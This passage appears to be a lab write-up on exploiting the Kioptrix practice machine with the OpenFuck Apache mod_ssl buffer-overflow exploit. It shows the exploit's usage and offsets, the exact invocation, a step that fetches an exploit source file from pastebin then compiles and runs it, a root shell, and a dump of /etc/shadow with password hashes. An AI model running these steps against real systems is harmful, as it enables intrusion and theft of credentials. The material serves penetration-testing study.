
**Our First step is to make research on this particular version and see if there are vulnerabilities and exploits**

Going to google and searching this way gives us a Remote Buffer overflow attack and target is vulnerable to **OpenFuck**:

![](https://i.imgur.com/tpg9NNp.png)

We can also confirm these by using **searchsploit**;

![](https://i.imgur.com/sKAQcHW.png)

---

## Exploitation

**We will be using the GitHub exploit, seems cool and updated, Naturally, if you see a github exploit, try to try it out first before choosing another**

- We can access the GitHub exploit from the first link after our Google search; https://github.com/heltonWernik/OpenLuck
- Follow the download instructions and let get to the exploitation stage
- here is the syntax for running the command:

```sh
â”Œâ”€â”€(sec-fortressã‰¿kali)-[~/kioptrix/OpenFuck]                                                 
â””â”€$ ./bankai                                                                                  

*******************************************************************                           
* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *                           
*******************************************************************                           
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *                           
* #hackarena  irc.brasnet.org                                     *
* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
*******************************************************************

: Usage: ./bankai target box [port] [-c N]                                                    

  target - supported box eg: 0x00                                                             
  box - hostname or IP address                                                                
  port - port for ssl connection                                                              
  -c open N connections. (use range 40-50 if u dont know)

  Supported OffSet:                                                                           
        0x00 - Caldera OpenLinux (apache-1.3.26)                                              
        0x01 - Cobalt Sun 6.0 (apache-1.3.12)                                                 
        0x02 - Cobalt Sun 6.0 (apache-1.3.20)                                                 
        0x03 - Cobalt Sun x (apache-1.3.26)                                                   
        0x04 - Cobalt Sun x Fixed2 (apache-1.3.26)                                            
        0x05 - Conectiva 4 (apache-1.3.6)                                                     
        0x06 - Conectiva 4.1 (apache-1.3.9)                                                   
        0x07 - Conectiva 6 (apache-1.3.14)                                                    
        0x08 - Conectiva 7 (apache-1.3.12)                                                    
        0x09 - Conectiva 7 (apache-1.3.19)                                                    
        0x0a - Conectiva 7/8 (apache-1.3.26)                                                  
        0x0b - Conectiva 8 (apache-1.3.22)                                                    
        0x0c - Debian GNU Linux 2.2 Potato (apache_1.3.9-14.1)                                
        0x0d - Debian GNU Linux (apache_1.3.19-1)                                             
        0x0e - Debian GNU Linux (apache_1.3.22-2)                                             
        0x0f - Debian GNU Linux (apache-1.3.22-2.1)                                           
        0x10 - Debian GNU Linux (apache-1.3.22-5)                                             
        0x11 - Debian GNU Linux (apache_1.3.23-1)                                             
        0x12 - Debian GNU Linux (apache_1.3.24-2.1)                                           
        0x13 - Debian Linux GNU Linux 2 (apache_1.3.24-2.1)                                   
        0x14 - Debian GNU Linux (apache_1.3.24-3)                                             
        0x15 - Debian GNU Linux (apache-1.3.26-1)                     
        0x16 - Debian GNU Linux 3.0 Woody (apache-1.3.26-1)

		.....
```

- Very good, so we can now do `./bankai 0x6b 172.16.216.130 -c 50`

***Note:**

- You don't need to specify the port for ssl connection since nmap doesn't return one
- Also make sure that target(0x00) is not mixed with box(172.16.216.130)
- Irrespective of choosing the right target, make sure your offset is set correctly
	- In our case it is **0x6b - Red Hat Linux 7.2 (Apache-1.3.20-16)2** because nmap told us so(Apache/1.3.20), also make sure to remember setting the target to `0x6b` so you wont get errors

- Once we are ready, run the exploit and we should be fine if target == vulnerable

```sh
â”Œâ”€â”€(sec-fortressã‰¿kali)-[~/kioptrix/OpenFuck]
â””â”€$ ./bankai 0x6b 172.16.216.130 -c 50

*******************************************************************
* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *
*******************************************************************
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
* #hackarena  irc.brasnet.org                                     *
* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
*******************************************************************

Connection... 50 of 50
Establishing SSL connection
cipher: 0x4043808c   ciphers: 0x80f81c8
Ready to send shellcode
Spawning shell...
bash: no job control in this shell
bash-2.05$ 
race-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; m/raw/C7v25Xr9 -O pt 
--13:53:30--  https://pastebin.com/raw/C7v25Xr9
           => `ptrace-kmod.c'
Connecting to pastebin.com:443... connected!
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/plain]

    0K ...                                                    @   1.28 MB/s

13:53:30 (982.91 KB/s) - `ptrace-kmod.c' saved [4026]

ptrace-kmod.c:183:1: warning: no newline at end of file
/usr/bin/ld: cannot open output file p: Permission denied
collect2: ld returned 1 exit status
ls
p
whoami
root
sudo -l
User root may run the following commands on this host:
    (ALL) ALL
cat /etc/shadow
root:$1$XROmcfDX$tF93GqnLHOJeGRHpaNyIs0:14513:0:99999:7:::
bin:*:14513:0:99999:7:::
daemon:*:14513:0:99999:7:::
adm:*:14513:0:99999:7:::
lp:*:14513:0:99999:7:::
sync:*:14513:0:99999:7:::
shutdown:*:14513:0:99999:7:::
halt:*:14513:0:99999:7:::
mail:*:14513:0:99999:7:::
news:*:14513:0:99999:7:::
uucp:*:14513:0:99999:7:::
operator:*:14513:0:99999:7:::
games:*:14513:0:99999:7:::
gopher:*:14513:0:99999:7:::
ftp:*:14513:0:99999:7:::
nobody:*:14513:0:99999:7:::
mailnull:!!:14513:0:99999:7:::
rpm:!!:14513:0:99999:7:::
xfs:!!:14513:0:99999:7:::
rpc:!!:14513:0:99999:7:::
rpcuser:!!:14513:0:99999:7:::
nfsnobody:!!:14513:0:99999:7:::
nscd:!!:14513:0:99999:7:::
ident:!!:14513:0:99999:7:::
radvd:!!:14513:0:99999:7:::
postgres:!!:14513:0:99999:7:::
apache:!!:14513:0:99999:7:::
squid:!!:14513:0:99999:7:::
pcap:!!:14513:0:99999:7:::
john:$1$zL4.MR4t$26N4YpTGceBO0gTX6TAky1:14513:0:99999:7:::
harold:$1$Xx6dZdOd$IMOGACl3r757dv17LZ9010:14513:0:99999:7:::
exit
Good Bye!
```

- Therefore we can now see our exploit was executed, thereby giving us shell as **root**, sweetðŸ¥¹, Not just that we have 3 active users on this system which are John, Harold and RootðŸš«